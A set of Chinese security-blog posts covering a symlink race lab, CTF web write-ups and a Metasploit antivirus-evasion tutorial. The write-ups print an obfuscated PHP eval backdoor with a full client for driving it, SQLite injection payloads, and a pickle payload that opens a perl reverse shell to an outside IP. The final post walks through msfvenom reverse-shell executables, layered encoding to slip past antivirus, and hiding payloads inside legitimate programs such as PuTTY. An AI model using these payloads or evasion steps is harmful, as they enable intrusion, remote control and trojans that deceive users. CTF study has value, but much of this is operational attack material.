在早期的单处理操作系统中，这样的代码可能是严谨的，出发点也是好的——因为单处理的话，进程执行完毕后才发生切换。但是在多任务的操作系统中有这样一个问题：在用access检查文件后，这个程序可能受到其他程序的干扰或者发生进程切换，在进程发生切换之后，进程失去了执行流程，并且在它还未再次获得执行时，它欲操作的文件发生改变——邪恶源头是因为access和open都是通过文件路径字符串作为参数的，这个路径可能是一个链接文件。在Linux中，假设要access一个/tmp/lx文件，在access后、open之前，/tmp/lx被替换成了一个链接文件，指向了其他文件（如/etc/passwd），如果这个进程有对/etc/passwd操作的权限，它最终所操作的并不是真正的/tmp/lx，而是/etc/passwd。\n\n简单地说就是access之后，在open文件之前把原来要open的文件链接到一个我们期望的文件。来操作一下\n\n这里就用这一台靶机，用xshell开三个窗口即可，这里简称x1,x2,x3\n\nx1在有权限创建文件的目录下新建一个文件，这里以/tmp/token为例，然后再新建一个执行脚本的文件，不停的改掉token10的指向，内容如下\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813193843.png)\n\n赋予权限并执行\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813193929.png)\n\nx2使用nc命令监听自己的18211（./flag10发送文件的端口，测试得知）准备接受文件，这里用-k来保持持续的链接状态\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813194931.png)\n\nx3同样在tmp目录下新建一个文件yy，内容如下（红框部分为接受文件的地址）\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813194039.png)\n\n这里的nice命令是更改优先序来执行程序，它的数值是-20到19，数字越大级别越低，把flag10的优先级变为最低，就有机会在access之后，open之前介入进程改掉/tmp/token10的指向\n\n同样赋予权限并执行\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813195135.png)\n\n这时执行后可以看到随着不停的将token10指向flag，token被读取\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813195411.png)\n\ntoken就是flag10用户的密码，登录即得flag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813200207.png)","categories":["ichunqiu综合渗透练习"]},{"title":"Web_php_wrong_nginx_config","url":"/2020/08/09/Web_php_wrong_nginx_config/","content":"\n平台：https://adworld.xctf.org.cn/\n打开是个登录框，但登录不了，扫目录发现robots.txt\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200809211937256.png)\nhint.php\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200809211959359.png)\nHack.php弹窗需要登录但抓包发现cookie处有个isLogin=0，抓包修改为1进入页面，同样手动修改cookie处isLogin为1使得不再跳转回登录页面\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200809212216395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\nurl可能存在文件包含\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200809212254427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n构造`admin/admin.php?file=..././..././..././..././etc/nginx/sites-enabled/site.conf&ext=`读取hint.php中的文件\n\n```php\nserver {\n    listen 8080; ## listen for ipv4; this line is default and implied\n    listen [::]:8080; ## listen for ipv6\n\n    root /var/www/html;\n    index index.php index.html index.htm;\n    port_in_redirect off;\n    server_name _;\n\n    # Make site accessible from http://localhost/\n    #server_name localhost;\n\n    # If block for setting the time for the logfile\n    if ($time_iso8601 ~ \"^(\\d{4})-(\\d{2})-(\\d{2})\") {\n       set $year $1;\n       set $month $2;\n       set $day $3;\n    }\n    # Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html\n    sendfile off;\n\n        set $http_x_forwarded_for_filt $http_x_forwarded_for;\n        if ($http_x_forwarded_for_filt ~ ([0-9]+\\.[0-9]+\\.[0-9]+\\.)[0-9]+) {\n                set $http_x_forwarded_for_filt $1???;\n        }\n\n    # Add stdout logging\n\n    access_log /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log;\n    error_log /var/log/nginx/error.log info;\n\n    location / {\n        # First attempt to serve request as file, then\n        # as directory, then fall back to index.html\n        try_files $uri $uri/ /index.php?q=$uri&$args;\n        server_tokens off;\n    }\n\n    #error_page 404 /404.html;\n\n    # redirect server error pages to the static page /50x.html\n    #\n    error_page 500 502 503 504 /50x.html;\n    location = /50x.html {\n        root /usr/share/nginx/html;\n    }\n    location ~ \\.php$ {\n        try_files $uri $uri/ /index.php?q=$uri&$args;\n        fastcgi_split_path_info ^(.+\\.php)(/.+)$;\n        fastcgi_pass unix:/var/run/php/php5.6-fpm.sock;\n        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n        fastcgi_param SCRIPT_NAME $fastcgi_script_name;\n        fastcgi_index index.php;\n        include fastcgi_params;\n        fastcgi_param REMOTE_ADDR $http_x_forwarded_for;\n    }\n\n    location ~ /\\. {\n            log_not_found off;\n            deny all;\n    }\n    location /web-img {\n        alias /images/;\n        autoindex on;\n    }\n    location ~* \\.(ini|docx|pcapng|doc)$ {  \n         deny all;  \n    }  \n\n    include /var/www/nginx[.]conf;\n}<!DOCTYPE html>\n```\n这里涉及到了知识盲区\nnginx中root和alias都可以定义在location模块中，都是用来指定请求资源的真实路径。 但root中真实的路径是root指定的值加上location指定的值 ，而alias指定的路径是location的别名，不管location的值怎么写，资源的真实路径都是 alias 指定的路径 。\n举个例子\n\n```php\nlocation /blacknight/ {\n  root /data/static;\n}\n```\n假设我们访问：http://localhost:80/blacknight/test.html\nroot的实际真实路径是：http://localhost:80/data/static/blacknight/test.html\n\n```php\nlocation /blacknight/ {\n  alias /data/static;\n}\n```\n假设我们访问：http://localhost:80/blacknight/test.html\nalias的实际真实路径是：http://localhost:80/data/static/test.html\n这里我们访问web-img../直接可以访问到根目录\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200809215257166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n在www目录下找到Hack.php.bak，应该是被混淆了\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200809215422936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n输出$f得代码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200809215954109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n整理一下\n\n```php\n<?php\n$kh=\"42f7\";\n$kf=\"e9ac\";\nfunction x($t,$k) {\n\t$c=strlen($k);\n\t$l=strlen($t);\n\t$o=\"\";\n\tfor ($i=0;$i<$l;) {\n\t\tfor ($j=0;($j<$c&&$i<$l);$j++,$i++) {\n\t\t\t$o.=$t {\n\t\t\t\t$i\n\t\t\t}\n\t\t\t^$k {\n\t\t\t\t$j\n\t\t\t}\n\t\t\t;\n\t\t}\n\t}\n\treturn $o;\n}\n$r=$_SERVER;\n$rr=@$r[\"HTTP_REFERER\"];\n$ra=@$r[\"HTTP_ACCEPT_LANGUAGE\"];\nif($rr&&$ra) {\n\t$u=parse_url($rr);\n\tparse_str($u[\"query\"],$q);\n\t$q=array_values($q);\n\tpreg_match_all(\"/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/\",$ra,$m);\n\tif($q&&$m) {\n\t\t@session_start();\n\t\t$s=&$_SESSION;\n\t\t$ss=\"substr\";\n\t\t$sl=\"strtolower\";\n\t\t$i=$m[1][0].$m[1][1];\n\t\t$h=$sl($ss(md5($i.$kh),0,3));\n\t\t$f=$sl($ss(md5($i.$kf),0,3));\n\t\t$p=\"\";\n\t\tfor ($z=1;$z<count($m[1]);$z++)$p.=$q[$m[2][$z]];\n\t\tif(strpos($p,$h)===0) {\n\t\t\t$s[$i]=\"\";\n\t\t\t$p=$ss($p,3);\n\t\t}\n\t\tif(array_key_exists($i,$s)) {\n\t\t\t$s[$i].=$p;\n\t\t\t$e=strpos($s[$i],$f);\n\t\t\tif($e) {\n\t\t\t\t$k=$kh.$kf;\n\t\t\t\tob_start();\n\t\t\t\t@eval(@gzuncompress(@x(@base64_decode(preg_replace(array(\"/_/\",\"/-/\"),array(\"/\",\"+\"),$ss($s[$i],0,$e))),$k)));\n\t\t\t\t$o=ob_get_contents();\n\t\t\t\tob_end_clean();\n\t\t\t\t$d=base64_encode(x(gzcompress($o),$k));\n\t\t\t\tprint(\"<$k>$d</$k>\");\n\t\t\t\t@session_destroy();\n\t\t\t}\n\t\t}\n\t}\n}\n```\n参考一个[PHP混淆后门的分析](https://www.cnblogs.com/go2bed/p/5920811.html)\n直接拿的脚本，修改下参数\n\n```php\n# encoding: utf-8\n\nfrom random import randint,choice\nfrom hashlib import md5\nimport urllib\nimport string\nimport zlib\nimport base64\nimport requests\nimport re\n\ndef choicePart(seq,amount):\n    length = len(seq)\n    if length == 0 or length < amount:\n        print 'Error Input'\n        return None\n    result = []\n    indexes = []\n    count = 0\n    while count < amount:\n        i = randint(0,length-1)\n        if not i in indexes:\n            indexes.append(i)\n            result.append(seq[i])\n            count += 1\n            if count == amount:\n                return result\n\ndef randBytesFlow(amount):\n    result = ''\n    for i in xrange(amount):\n        result += chr(randint(0,255))\n    return  result\n\ndef randAlpha(amount):\n    result = ''\n    for i in xrange(amount):\n        result += choice(string.ascii_letters)\n    return result\n\ndef loopXor(text,key):\n    result = ''\n    lenKey = len(key)\n    lenTxt = len(text)\n    iTxt = 0\n    while iTxt < lenTxt:\n        iKey = 0\n        while iTxt<lenTxt and iKey<lenKey:\n            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))\n            iTxt += 1\n            iKey += 1\n    return result\n\n\ndef debugPrint(msg):\n    if debugging:\n        print msg\n\n# config\ndebugging = False\nkeyh = \"42f7\" # $kh\nkeyf = \"e9ac\" # $kf\nxorKey = keyh + keyf\nurl = 'http://220.249.52.133:43429/hack.php'\ndefaultLang = 'zh-CN'\nlanguages = ['zh-TW;q=0.%d','zh-HK;q=0.%d','en-US;q=0.%d','en;q=0.%d']\nproxies = None # {'http':'http://127.0.0.1:8080'} # proxy for debug\n\nsess = requests.Session()\n\n# generate random Accept-Language only once each session\nlangTmp = choicePart(languages,3)\nindexes = sorted(choicePart(range(1,10),3), reverse=True)\n\nacceptLang = [defaultLang]\nfor i in xrange(3):\n    acceptLang.append(langTmp[i] % (indexes[i],))\nacceptLangStr = ','.join(acceptLang)\ndebugPrint(acceptLangStr)\n\ninit2Char = acceptLang[0][0] + acceptLang[1][0] # $i\nmd5head = (md5(init2Char + keyh).hexdigest())[0:3]\nmd5tail = (md5(init2Char + keyf).hexdigest())[0:3] + randAlpha(randint(3,8))\ndebugPrint('$i is %s' % (init2Char))\ndebugPrint('md5 head: %s' % (md5head,))\ndebugPrint('md5 tail: %s' % (md5tail,))\n\n# Interactive php shell\ncmd = raw_input('phpshell > ')\nwhile cmd != '':\n    # build junk data in referer\n    query = []\n    for i in xrange(max(indexes)+1+randint(0,2)):\n        key = randAlpha(randint(3,6))\n        value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12)))\n        query.append((key, value))\n    debugPrint('Before insert payload:')\n    debugPrint(query)\n    debugPrint(urllib.urlencode(query))\n\n    # encode payload\n    payload = zlib.compress(cmd)\n    payload = loopXor(payload,xorKey)\n    payload = base64.urlsafe_b64encode(payload)\n    payload = md5head + payload\n\n    # cut payload, replace into referer\n    cutIndex = randint(2,len(payload)-3)\n    payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail)\n    iPiece = 0\n    for i in indexes:\n        query[i] = (query[i][0],payloadPieces[iPiece])\n        iPiece += 1\n    referer = url + '?' + urllib.urlencode(query)\n    debugPrint('After insert payload, referer is:')\n    debugPrint(query)\n    debugPrint(referer)\n\n    # send request\n    r = sess.get(url,headers={'Accept-Language':acceptLangStr,'Referer':referer},proxies=proxies)\n    html = r.text\n    debugPrint(html)\n\n    # process response\n    pattern = re.compile(r'<%s>(.*)</%s>' % (xorKey,xorKey))\n    output = pattern.findall(html)\n    if len(output) == 0:\n        print 'Error,  no backdoor response'\n        cmd = raw_input('phpshell > ')\n        continue\n    output = output[0]\n    debugPrint(output)\n    output = output.decode('base64')\n    output = loopXor(output,xorKey)\n    output = zlib.decompress(output)\n    print output\n    cmd = raw_input('phpshell > ')\n```\nshell拿flag\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200809220810512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n又是无情靠wp过活的一天~","tags":["php混淆"],"categories":["buu刷题"]},{"title":"Zer0pts2020web复现","url":"/2020/08/06/Zer0pts2020_web/","content":"\n## Can you guess it?\n\n让我们猜什么东西，点击source可以得到源码\n\n```php\n<?php\ninclude 'config.php'; // FLAG is defined in config.php\n\nif (preg_match('/config\\.php\\/*$/i', $_SERVER['PHP_SELF'])) {\n  exit(\"I don't know what you are thinking, but I won't let you read it :)\");\n}\n\nif (isset($_GET['source'])) {\n  highlight_file(basename($_SERVER['PHP_SELF']));\n  exit();\n}\n\n$secret = bin2hex(random_bytes(64));\nif (isset($_POST['guess'])) {\n  $guess = (string) $_POST['guess'];\n  if (hash_equals($secret, $guess)) {\n    $message = 'Congratulations! The flag is: ' . FLAG;\n  } else {\n    $message = 'Wrong.';\n  }\n}\n?>\n<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n    <title>Can you guess it?</title>\n  </head>\n  <body>\n    <h1>Can you guess it?</h1>\n    <p>If your guess is correct, I'll give you the flag.</p>\n    <p><a href=\"?source\">Source</a></p>\n    <hr>\n<?php if (isset($message)) { ?>\n    <p><?= $message ?></p>\n<?php } ?>\n    <form action=\"index.php\" method=\"POST\">\n      <input type=\"text\" name=\"guess\">\n      <input type=\"submit\">\n    </form>\n  </body>\n</html>\n```\n\n定义了一个`$secret`是随机的64位字符串的十六进制，如果我们post的`$guess`参数满足`hash_equals($secret, $guess)`，则可以得到flag。\n\nphp5.6版本新增了一个函数hash_equals，可防止时序攻击的字符串比较。\n\n> 在密码学中,时序攻击是一种侧信道攻击,攻击者试图通过分析加密算法的时间执行来推导出密码。每一个逻辑运算在计算机需要时间来执行,根据输入不同,精确测量执行时间,根据执行时间反推出密码。\n>\n> 如果是用普通的 == 来进行比较，那么两个字符串是从第一位开始逐一进行比较的，发现不同就立即返回 false，那么通过计算返回的速度就知道了大概是哪一位开始不同的，这样就实现了电影中经常出现的按位破解密码的场景。\n\n回到题目，可以看到读取源码的地方使用了`basename($_SERVER['PHP_SELF'])`，读取的是当前执行脚本的文件名，`index.php?source`读的是index.php，但把config.php加后面读的就是config.php\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806093000.png)\n\n但这里加了过滤条件`/config\\.php\\/*$/i`不允许config.php后面加参数，这里涉及到了basename的一个[问题](https://bugs.php.net/bug.php?id=62119)，它会自动去掉文件名开头或者末尾的非ASCII值\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806091654.png)\n\n那么请求`index.php/config.php%ff?source`即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806092448.png)\n\n## phpNantokaAdmin\n\n首页是一个可以创建表的管理界面，创建表之后可以插入数据，也可以删除表\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806093330.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806093436.png)\n\n源码得知数据库是sqlite\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806100842.png)\n\nsqlite数据库中，当列名用`\" ' []`等字符隔开时，sqlite只会把这些字符包含的字符串当做列名，并且忽视后面的字符串\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806105714.png)\n\n并且sqlite可以create table ... as select ...，把select的查询结果放到创建的表中\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806101419.png)\n\n题目中sql语句大概是\n\n```\nCREATE TABLE $table_name (dummy1 TEXT, dummy2 TEXT, `$column` $type);\n```\n\n如果我们创建表时传入\n\n```\ntable_name=[aaa] as select [sql][&columns[0][name]=]from sqlite_master;&columns[0][type]=2\n```\n\n就相当于\n\n```\n$sql = \"CREATE TABLE [aaa] as select [sql][ (dummy1 TEXT, dummy2 TEXT, `]from sqlite_master;` 2);\";\n```\n\n`[sql]`后面的`[(dummy1 TEXT, dummy2 TEXT, `\\`]被忽略，就相当于\n\n```\ncreate table [aaa] as select sql from sqlite_master\n```\n\n> SQLite数据库中有一个内置表，名为SQLITE_MASTER，此表中存储着当前数据库中所有表的相关信息，比如表的名称、用于创建此表的sql语句、索引、索引所属的表、创建索引的sql语句等。\n\n抓包修改post\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806104734.png)\n\n得到了数据库和字段名\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806104807.png)\n\n那么再接着读\n\n```\ntable_name=[aaa] as select [flag_2a2d04c3][&columns[0][name]=]from flag_bf1811da;&columns[0][type]=2\n```\n\n就是\n\n```\n$sql = \"CREATE TABLE [aaa] as select [flag_2a2d04c3][ (dummy1 TEXT, dummy2 TEXT, `]from flag_bf1811da;` 2);\";\n```\n\n相当于\n\n```\ncreate table aaa as select flag_2a2d04c3 from flag_bf1811da\n```\n\n同样抓包修改\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806105046.png)\n\n得到flag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806105105.png)\n\n## musicblog\n\n注册登录可以发post\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806112531.png)\n\n看到这个管理员会检查post以为是xss但是尝试无果，抓包发现设置了CSP无法跨域请求\n\n![img](https://raw.githubusercontent.com/blacknight12231/cdn/master/20200806113824.png)\n\n测试标签只允许audio其他一概过滤，但在audio里加上`/`后，发现`/`会被替换称空格，audio标签会被自动隔断从而`/`前面的内容在html内形成`<a>`标签\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806115104.png)\n\n也就可以构造超链接，而超链接是不受CSP影响的，所以我们构造一个超链接让bot管理员点击，就达到了目的\n\n构造\n\n```\n<a/udio id=like href=http://http.requestbin.buuoj.cn/1cap6um1>blacknight\n```\n\npost上去之后\n\n```\n<a udio id=like href=http://http.requestbin.buuoj.cn/1cap6um1>blacknight\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806115628.png)\n\n得到flag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806115707.png)\n\n看别的师傅的wp应该是这里bot检查脚本用了strip_tags函数，存在[漏洞](https://bugs.php.net/bug.php?id=78814)\n\n## notepad\n\n一个简化的文本编辑器\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806120444.png)\n\n源码404页面的referer处存在模板注入\n\n```python\ndef page_not_found(error):\n    \"\"\" Automatically go back when page is not found \"\"\"\n    referrer = flask.request.headers.get(\"Referer\")\n    \n    if referrer is None: referrer = '/'\n    if not valid_url(referrer): referrer = '/'\n    \n    html = '<html><head><meta http-equiv=\"Refresh\" content=\"3;URL={}\"><title>404 Not Found</title></head><body>Page not found. Redirecting...</body></html>'.format(referrer)\n    \n    return flask.render_template_string(html), 404\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806130736.png)\n\n查看{{config}}得到secert_key\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806131026.png)\n\n但由于源码处队url做了长度限制，不能更进一步利用\n\n```python\ndef valid_url(url):\n    \"\"\" Check if given url is valid \"\"\"\n    host = flask.request.host_url\n    \n    if not url.startswith(host): return False  # Not from my server\n    if len(url) - len(host) > 16: return False # Referer may be also 404\n    \n    return True\n```\n\n解密session有个savedata\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806131906.png)\n\n源码查看savedata会被base64解码。然后反序列化\n\n```python\ndef load():\n    \"\"\" Load saved notes \"\"\"\n    try:\n        savedata = flask.session.get('savedata', None)\n        data = pickle.loads(base64.b64decode(savedata))\n    except:\n        data = [{\"date\": now(), \"text\": \"\", \"title\": \"*New Note*\"}]\n    \n    return data\n```\n\n有了secert_key，可以伪造一个shell进去\n\n```python\nimport base64\nimport os\nimport pickle\n\n\nclass A(object):\n    def __reduce__(self):\n         return (os.system,(\"\"\"perl -e 'use Socket;$i=\"174.2.214.12\";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\"\"\",))\na = A()\nprint(base64.b64encode(pickle.dumps(a)))\n```\n\n由于key包含不可见字符，先python用encodeBytes处理一下再伪造时base64解码\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806182400.png)\n\n然后访问note/1触发\n\nnc，perl都试了还是弹不到。。。结合其他师傅的wp搞了好久。。。今天心态有点爆炸，过几天来看看\n\n","tags":["CSP","ssti","sqlite"],"categories":["CTF"]},{"title":"metasploit免杀技巧","url":"/2020/07/28/msf_note5/","content":"\n### msf生成可独立运行二进制文件\n\n以windows可执行文件为例，执行\n\n```\nmsfvenom -p windows/shell_reverse_tcp LHOST=192.168.48.128 LPORT=8080 -f exe -o payload.exe\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728101445.png)\n\n这样就生成了一个windows上可执行的反弹shell程序，然后可以使用**multi/handler**模块在MSF终端启动一个监听器，对反弹连接进行监听和处理。\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728104422.png)\n\n之后在windows上运行exe文件即可建立会话\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728104521.png)\n\n### 躲避杀毒软件检测\n\n#### 使用msf编码器\n\nMSF编码器将原始的可执行程序重新编码，并生成一个新的二进制文件，当这个文件运行后，MSF编码器会将原始程序解码到内存中执行\n\n使用`msfvenom -l encoders`列出所有可用的编码格式，可以看到除了名称和描述外，msf还给每个编码器评定了等级（注意不同的编码格式适用于不同的操作系统平台）\n\n```\nroot@kali:/opt# msfvenom -l encoders\n\nFramework Encoders [--encoder <value>]\n======================================\n\n    Name                          Rank       Description\n    ----                          ----       -----------\n    cmd/brace                     low        Bash Brace Expansion Command Encoder\n    cmd/echo                      good       Echo Command Encoder\n    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder\n    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder\n    cmd/perl                      normal     Perl Command Encoder\n    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder\n    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder\n    generic/eicar                 manual     The EICAR Encoder\n    generic/none                  normal     The \"none\" Encoder\n    mipsbe/byte_xori              normal     Byte XORi Encoder\n    mipsbe/longxor                normal     XOR Encoder\n    mipsle/byte_xori              normal     Byte XORi Encoder\n    mipsle/longxor                normal     XOR Encoder\n    php/base64                    great      PHP Base64 Encoder\n    ppc/longxor                   normal     PPC LongXOR Encoder\n    ppc/longxor_tag               normal     PPC LongXOR Encoder\n    ruby/base64                   great      Ruby Base64 Encoder\n    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder\n    x64/xor                       normal     XOR Encoder\n    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder\n    x64/xor_dynamic               normal     Dynamic key XOR Encoder\n    x64/zutto_dekiru              manual     Zutto Dekiru\n    x86/add_sub                   manual     Add/Sub Encoder\n    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder\n    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder\n    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower\n    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower\n    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder\n    x86/bmp_polyglot              manual     BMP Polyglot\n    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder\n    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder\n    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder\n    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder\n    x86/countdown                 normal     Single-byte XOR Countdown Encoder\n    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder\n    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder\n    x86/nonalpha                  low        Non-Alpha Encoder\n    x86/nonupper                  low        Non-Upper Encoder\n    x86/opt_sub                   manual     Sub Encoder (optimised)\n    x86/service                   manual     Register Service\n    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder\n    x86/single_static_bit         manual     Single Static Bit\n    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder\n    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder\n    x86/xor_dynamic               normal     Dynamic key XOR Encoder\n```\n\n生成攻击载荷时使用`-e`指定使用编码器\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728110342.png)\n\n#### 多重编码\n\nMSF允许对攻击载荷文件进行多次编码，以降低被杀毒软件检测的风险\n\n示例：\n\n```\nroot@kali:/opt# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.48.128 LPORT=8080 -e x86/shikata_ga_nai -i 10 -f raw|msfvenom -e x86/alpha_upper -a x86 --platform windows -i 5 -f raw|msfvenom -e x86/shikata_ga_nai -a x86 --platform windows -i 10 -f raw|msfvenom -e x86/countdown -a x86 --platform windows -i 10 -f exe -o payload.exe\nAttempting to read payload from STDIN...Attempting to read payload from STDIN...\nAttempting to read payload from STDIN...\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nFound 1 compatible encoders\nAttempting to encode payload with 10 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 351 (iteration=0)\n...\nx86/shikata_ga_nai succeeded with size 594 (iteration=9)\nx86/shikata_ga_nai chosen with final size 594\nPayload size: 594 bytes\n\nFound 1 compatible encoders\nAttempting to encode payload with 5 iterations of x86/alpha_upper\nx86/alpha_upper succeeded with size 1255 (iteration=0)\n...\nx86/alpha_upper succeeded with size 21115 (iteration=4)\nx86/alpha_upper chosen with final size 21115\nPayload size: 21115 bytes\n\nFound 1 compatible encoders\nAttempting to encode payload with 10 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 21144 (iteration=0)\n...\nx86/shikata_ga_nai succeeded with size 21405 (iteration=9)\nx86/shikata_ga_nai chosen with final size 21405\nPayload size: 21405 bytes\nFound 1 compatible encoders\nAttempting to encode payload with 10 iterations of x86/countdown\nx86/countdown succeeded with size 21423 (iteration=0)\n...\nx86/countdown succeeded with size 21585 (iteration=9)\nx86/countdown chosen with final size 21585\nPayload size: 21585 bytes\nFinal size of exe file: 73802 bytes\nSaved as: payload.exe\nroot@kali:/opt# \n\n```\n\n这里我们先使用了10次**shikata_ga_na**i编码，将编码后的原始数据又进行了5次**alpha_upper**编码，然后再进行10次**shika_ga_nai**编码，接着进行10次**countdown**编码，最后生成可执行文件。\n\n#### 自定义可执行文件模板\n\n通常情况下执行**msfvenom**命令时，攻击载荷将被嵌入到位于data/templates/template.exe的默认的可执行文件模板中，虽然这个模板文件会更新，但它永远是杀毒软件的重点关注对象\n\n当前的**msfvenom**支持使用**-x**选项使用任意的windows可执行程序来代替默认模板文件，下面的例子中我们可以重新对攻击载荷进行编码，并将微软Sysinternals套件中的Process Explorer程序作为自定义的可执行程序模块\n\n首先从Microsoft网站下载Process Explorer软件并解压\n\n```\n wget http://download.sysinternals.com/files/ProcessExplorer.zip\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728113424.png)\n\n接着指定模板文件生成攻击载荷，这样就可以得到自定义模板的可执行程序\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728113626.png)\n\n#### 隐秘的启动一个攻击载荷\n\n如果用户运行了你的后门执行文件但却什么都没发生，很容易就会引起怀疑，为了避免被目标察觉，可以在启动攻击载荷的同时，让宿主程序也正常的运行起来\n\nMSF中使用选项-k会配置攻击载荷在一个独立线程中启动，这样宿主程序在执行时不会收到影响。\n\n以ssh客户端Putty为例\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728120024.png)\n\n在msf建立监听，靶机执行文件试试效果\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728120324.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728120427.png)\n\n可以看到成功打开了shell，而且用户软件可以正常显示和使用。\n\n#### 